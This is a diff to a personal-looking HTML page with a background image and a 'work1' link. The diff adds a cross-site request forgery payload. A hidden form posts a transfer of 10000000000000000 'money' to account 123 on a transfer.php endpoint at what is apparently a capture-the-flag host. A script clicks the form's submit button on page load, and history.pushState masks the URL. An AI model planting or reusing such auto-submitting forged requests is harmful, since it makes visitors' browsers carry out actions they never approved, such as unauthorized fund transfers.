@@ -12,5 +12,15 @@
     background-size:100% 100%;
     background-attachment: fixed;"><!--使图片铺满屏幕，且不重复，随着页面滚动而移动-->
     <a href="work1/work1.html" style="color:#66ff99 ;">work1</a>
+        <script>history.pushState('', '', '/')</script>
+    <form action="http://3dddae95-2615-427b-82a0-18f7d2cf4e80.node5.buuoj.cn:81/transfer.php" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="target" value="123" />
+      <input type="hidden" name="money" value="10000000000000000" />
+      <input type="hidden" name="messages" value="ccc" />
+      <input type="submit" value="Submit request" id="onclick_1" />
+    </form>
+    <script type="text/javascript">
+      document.getElementById("onclick_1").click();
+    </script>
     </body>
 </html>
